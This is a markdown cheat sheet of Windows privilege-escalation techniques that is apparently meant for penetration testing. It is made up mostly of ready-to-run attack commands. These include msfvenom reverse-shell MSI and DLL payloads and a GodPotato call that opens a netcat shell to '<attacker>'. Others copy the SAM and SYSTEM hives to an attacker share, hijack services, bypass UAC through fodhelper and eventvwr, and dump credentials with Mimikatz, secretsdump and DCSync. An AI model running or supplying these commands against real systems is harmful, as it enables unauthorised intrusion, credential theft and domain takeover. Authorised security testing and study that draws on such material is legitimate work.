# Windows Privilege Escalation

Techniques for elevating privileges on Windows systems.

## Enumeration Tools

| Tool | Description |
|:-----|:------------|
| **WinPEAS** | Automated Windows enumeration |
| **PowerUp.ps1** | PowerShell privesc finder |
| **Seatbelt** | C# security checks |
| **SharpUp** | C# version of PowerUp |

```powershell
# Run WinPEAS
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

---

## Quick Wins

### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# If path is: C:\Program Files\Some Service\service.exe
# Create: C:\Program.exe or C:\Program Files\Some.exe
```

### Writable Service Binaries
```powershell
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If writable, replace binary
sc qc <service>
# Replace the binary path with reverse shell
```

### AlwaysInstallElevated
```cmd
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, create MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

---

## Token Impersonation

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

Check with: `whoami /priv`

**Tools:**
| Tool | Use Case |
|:-----|:---------|
| **PrintSpoofer** | Windows 10/Server 2016-2019 |
| **GodPotato** | Most Windows versions |
| **JuicyPotato** | Older Windows |
| **RoguePotato** | Newer Windows |
| **SweetPotato** | Combined techniques |

```cmd
# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# GodPotato
GodPotato.exe -cmd "nc.exe <attacker> 4444 -e cmd"

# JuicyPotato (needs CLSID)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\shell.exe" -t *
```

### SeBackupPrivilege
```cmd
# Copy SAM and SYSTEM
reg save hklm\sam sam.save
reg save hklm\system system.save

# Extract hashes with secretsdump
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

## Credential Hunting

### Saved Credentials
```cmd
# List saved credentials
cmdkey /list

# Use saved creds
runas /savecred /user:admin cmd.exe
```

### Unattend Files
```cmd
# Search for passwords in unattend files
dir /s *unattend*.xml
dir /s *sysprep*.xml
type C:\unattend.xml | findstr password
```

### Common Locations
```cmd
# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

# SAM/SYSTEM (if accessible)
copy C:\Windows\System32\config\SAM \\<attacker>\share\
copy C:\Windows\System32\config\SYSTEM \\<attacker>\share\
```

### Search for Passwords
```cmd
findstr /si password *.txt *.xml *.ini *.config
dir /s *pass* *cred* *vnc* *.config
```

---

## Service Exploitation

### Weak Service Permissions
```cmd
# Check with accesschk
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# If SERVICE_CHANGE_CONFIG allowed:
sc config <service> binpath= "C:\shell.exe"
sc stop <service>
sc start <service>
```

### DLL Hijacking
```cmd
# Find missing DLLs
# Use Process Monitor to find DLL load failures

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o evil.dll

# Place in application directory or PATH location
```

---

## Scheduled Tasks

```cmd
# List scheduled tasks
schtasks /query /fo LIST /v

# Look for writable script locations
# Replace script with payload
```

---

## UAC Bypass

### fodhelper.exe
```cmd
# Works on Windows 10
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```

### eventvwr.exe
```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

---

## Mimikatz

```cmd
# Run as admin
mimikatz.exe

# Get plain text passwords
privilege::debug
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# DCSync (Domain Controller)
lsadump::dcsync /domain:corp.local /user:Administrator
```

---

## Quick Checklist

- [ ] Run WinPEAS / PowerUp
- [ ] Check `whoami /priv`
- [ ] Look for unquoted service paths
- [ ] Check AlwaysInstallElevated
- [ ] Search for credentials in files
- [ ] Check saved credentials
- [ ] Look for writable services
- [ ] Check scheduled tasks
- [ ] Try token impersonation (if SeImpersonate)
- [ ] Check for kernel exploits

---

## Resources

- [HackTricks Windows PrivEsc](https://book.hacktricks.wiki/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS](https://lolbas-project.github.io/)
